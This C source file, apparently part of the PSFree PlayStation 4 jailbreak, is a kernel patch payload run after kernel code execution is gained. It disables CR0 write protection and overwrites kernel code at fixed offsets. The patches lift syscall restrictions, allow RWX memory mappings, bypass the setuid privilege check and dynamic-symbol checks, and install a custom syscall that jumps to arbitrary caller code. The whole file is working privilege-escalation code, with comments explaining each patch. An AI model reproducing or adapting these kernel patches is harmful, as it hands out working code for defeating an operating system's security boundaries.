/* Copyright (C) 2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

#include <stddef.h>

#include "types.h"
#include "utils.h"

// Args:
//   res:
//     Needed value to return (as to not crash) if the caller of the hijacked
//     function is expecting some valid value.
//   error:
//     Address to return an error. 0 for success.
__attribute__((section (".text.start")))
u64 kpatch(u64 res, u64 *error) {
    // offset to fast_syscall()
    const size_t off_fast_syscall = 0x1c0;
    void * const kbase = (void *)rdmsr(0xc0000082) - off_fast_syscall;

    disable_cr0_wp();

    // patch amd64_syscall() to allow calling syscalls everywhere

    //     mov     ecx, 0xffffffff ; at 0x490, patch to "mov ecx, 0"
    //     mov     rax, qword [r15 + 0x340] ; check if libkernel is loaded
    //     test    rax, rax
    //     je      not_loaded
    //     ; 0x4b5 and 0x4b9 are replaced with NOPs so that we always reach
    //     ; 0x4c2
    //     ...
    //     je target ; at 0x4c2, patch je to jmp
    // not_loaded:
    //     test ecx, ecx, ; ecx = 0, always jump to target
    //     je target
    //     ...
    // target:
    //     test    byte [rbx + 0x469], 2
    //     jne     ...
    //
    // Following the target code path, you will at one point reach this:
    //     lea     rsi, [rbp + 0x78]
    //     mov     rdi, rbx
    //     mov     rax, qword [rbp + 0x80]
    //     call    qword [rax + 8] ; error = (sa->callp->sy_call)(td, sa->args)
    //
    // sy_call() is the function that will execute the requested syscall.
    write32(kbase, 0x490, 0);
    write16(kbase, 0x4b5, 0x9090);
    write16(kbase, 0x4b9, 0x9090);
    write8(kbase, 0x4c2, 0xeb);

    // patch sys_mmap() to allow rwx mappings

    // patch maximum cpu mem protection: 0x33 -> 0x37
    // the ps4 added custom protections for their gpu memory accesses
    // GPU R: 0x10, W: 0x20, X:, 0x40
    // that's why you see other bits set
    write8(kbase, 0xfd03a, 0x37);
    write8(kbase, 0xfd03d, 0x37);

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    write32(kbase, 0x3ec68d, 0);

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere

    // call    ...
    // mov     r14, qword [rbp + 0xad0]
    // cmp     eax, 0x4000000
    // jb      ... ; patch je to jmp
    write8(kbase, 0x31953f, 0xeb);
    // patch called function to always return 0
    //
    // sys_dynlib_dlysm:
    //     ...
    //     mov     edi, 0x10 ; 16
    //     call    patched_function ; kernel_base + 0x951c0
    //     test    eax, eax
    //     je      ...
    //     mov     rax, qword [rbp + 0xad8]
    //     ...
    // patched_function: ; patch to "xor eax, eax; ret"
    //     push    rbp
    //     mov     rbp, rsp
    //     ...
    write32(kbase, 0x951c0, 0xC3C03148);

    // patch sys_setuid() to allow freely changing the effective user ID

    // ; PRIV_CRED_SETUID = 50
    // call priv_check_cred(oldcred, PRIV_CRED_SETUID, 0)
    // test eax, eax
    // je ... ; patch je to jmp
    write8(kbase, 0x34d696, 0xeb);

    // overwrite the entry of syscall 11 (unimplemented) in sysent
    //
    // struct args {
    //     u64 rdi;
    //     u64 rsi;
    //     u64 rdx;
    //     u64 rcx;
    //     u64 r8;
    //     u64 r9;
    // }
    //
    // jumps to uap->rdi
    // u32 sys_kexec(struct thread td, struct args *uap)

    // sysent[11]
    const size_t offset_sysent_11 = 0x10fc6e0;
    // .sy_narg = 6
    write32(kbase, offset_sysent_11, 6);
    // .sy_call = gadgets['jmp qword ptr [rsi]']
    write64(kbase, offset_sysent_11 + 8, kbase + 0xe629c);
    // .sy_thrcnt = SY_THR_STATIC
    write32(kbase, offset_sysent_11 + 0x2c, 1);

    // restore socketops.fo_chmod
    // it was used initially to perform kernel code execution
    write64(kbase, 0x1a76060, kbase + 0x3d0a60);

    enable_cr0_wp();

    if (error != NULL) {
        *error = 0;
    }
end:
    return res;
}
